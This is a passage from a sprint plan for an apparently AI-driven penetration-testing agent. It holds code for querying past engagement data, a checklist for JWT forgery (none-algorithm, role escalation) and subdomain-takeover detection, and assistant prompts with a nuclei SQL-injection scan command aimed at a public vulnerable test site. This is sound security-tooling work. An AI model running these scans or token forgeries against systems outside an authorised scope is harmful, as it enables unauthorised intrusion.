
    # Inject learning context ke plan generation
    plan = await llm.plan_engagement(
        target=state["target"],
        scope=state["scope"],
        knowledge_hints=knowledge,
        learning_context=learning_context,  # NEW
    )
```

```python
# packages/pentra-agent/pentra_agent/utils/learning_query.py

from sqlalchemy import select
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession


async def query_similar_learnings(
    tech_stack: list[str],
    domain_pattern: str,
    db_url: str,
    limit: int = 3,
) -> list:
    """
    Query EngagementLearning records yang relevan.
    Similar = tech stack overlap ATAU domain pattern match.
    """
    if not db_url:
        return []

    try:
        engine = create_async_engine(db_url)
        async with AsyncSession(engine) as session:
            from apps.api.app.db.models import EngagementLearningORM
            from sqlalchemy import cast
            from sqlalchemy.dialects.postgresql import JSONB

            # Simple query: engagements dengan findings > 0
            result = await session.execute(
                select(EngagementLearningORM)
                .where(EngagementLearningORM.findings_count > 0)
                .order_by(EngagementLearningORM.high_critical_count.desc())
                .limit(limit * 3)  # Get more, filter by relevance
            )
            all_learnings = result.scalars().all()

            # Score by relevance
            scored = []
            for l in all_learnings:
                score = 0
                for tech in tech_stack:
                    if tech.lower() in [t.lower() for t in (l.tech_stack or [])]:
                        score += 2
                if score > 0:
                    scored.append((score, l))

            scored.sort(key=lambda x: -x[0])
            return [l for _, l in scored[:limit]]
    except Exception as e:
        logger.debug("[plan_node] Learning query failed: %s", e)
        return []
```

---

## Checklist Sprint 20

```
Task 20.1 — JWT Testing
[ ] jwt_tester.py dibuat dengan 5 attack types
[ ] decode_jwt(), forge_none_algorithm(), forge_role_escalation()
[ ] test_jwt_vulnerabilities() main function
[ ] 5 unit tests pass
[ ] Integrasi ke vuln_hunt_node.py (parallel tools)
[ ] Log: "[jwt_tester] Testing JWT: alg=HS256 sub=..."

Task 20.2 — Subdomain Takeover
[ ] takeover_detector.py dengan 12 service fingerprints
[ ] check_takeover_fingerprint() function
[ ] detect_subdomain_takeovers() main function
[ ] 3 unit tests pass
[ ] Integrasi ke recon_node.py setelah subfinder
[ ] dnspython ditambahkan ke requirements

Task 20.3 — Nuclei 0 Findings Fix
[ ] Diagnosa manual: nuclei berjalan OK, output JSON valid
[ ] HTTPS→HTTP fallback ada dan berfungsi
[ ] Tech-aware tags (iis, asp, nginx, apache, wordpress)
[ ] Timeout naik ke 15 detik
[ ] Verbose logging saat 0 findings
[ ] Verifikasi: nuclei return > 0 findings pada testaspnet.vulnweb.com

Task 20.4 — E2E Validation
[ ] Engagement baru di testaspnet.vulnweb.com
[ ] Log: jwt_tester berjalan
[ ] Log: takeover detection berjalan
[ ] Log: nuclei > 0 findings
[ ] Total findings >= 10 (sama atau lebih dari Sprint 16)
[ ] PDF report valid

Task 20.5 — KB Scale-Up
[ ] Trigger H1 bulk import pages 21-60
[ ] KB records > 5,000 setelah import selesai
[ ] Verify search quality: query "JWT algorithm confusion" return relevant results

Task 20.6 — EngagementLearning di plan_node
[ ] query_similar_learnings() function
[ ] plan_node memanggil dan inject ke plan generation
[ ] Log: "Found N past learnings for context" saat ada history
[ ] Plan lebih spesifik untuk ASP.NET target (test dengan target yang sudah pernah di-scan)

Total tests baru: 5+3 = 8+
Total tests target: 268 + 8 = 276+
```

---

## Prompt untuk Copilot

**Mulai Task 20.1 (JWT) + 20.2 (Takeover):**

```
Baca CLAUDE.md, PROGRESS.md, dan SPRINT-20.md secara lengkap.

Sprint 20 menambahkan 2 security capabilities kritis yang sering menghasilkan
high/critical findings di H1: JWT testing dan subdomain takeover detection.

Mulai Task 20.1 — JWT Vulnerability Tester:
1. Buat packages/pentra-tools/pentra_tools/vuln/jwt_tester.py
   sesuai kode di SPRINT-20.md Task 20.1 (lengkap semua fungsi)
2. Buat packages/pentra-tools/tests/test_jwt_tester.py dengan 5 tests
3. Jalankan tests: uv run pytest packages/pentra-tools/tests/test_jwt_tester.py -v
4. Update vuln_hunt_node.py — tambahkan JWT testing di parallel tools

Lanjut Task 20.2 — Subdomain Takeover:
1. Buat packages/pentra-tools/pentra_tools/recon/takeover_detector.py
   sesuai kode di SPRINT-20.md Task 20.2
2. Tambahkan dnspython ke requirements
3. Buat 3 unit tests
4. Integrasi ke recon_node.py setelah subfinder selesai

Setelah keduanya selesai:
uv run pytest packages/ -q → Expected 276+ tests, 0 failed.
```

**Task 20.3 (Nuclei fix) — jalankan diagnosa manual dulu:**

```
Task 20.1 + 20.2 selesai.

Sekarang Task 20.3 — nuclei 0 findings fix.
Tapi sebelum coding, jalankan diagnosa ini dan laporkan hasilnya:

  nuclei -version
  nuclei -u http://testaspnet.vulnweb.com/ -tags sqli -timeout 10 -silent -j | head -10

Berdasarkan output diagnosa, lakukan fix yang sesuai di vuln_hunt_node.py.
```

---

*SPRINT-20.md — Pentra AI*  
*Gap analysis dari 4 perspektif: Security + Systems + Product + Data Engineering*  
*New capabilities: JWT vulnerability testing (6 attack types), subdomain takeover (12 fingerprints)*  
*Critical fix: nuclei 0 findings root cause + resolution*  
*Target: 276+ tests, JWT/takeover findings di E2E run*
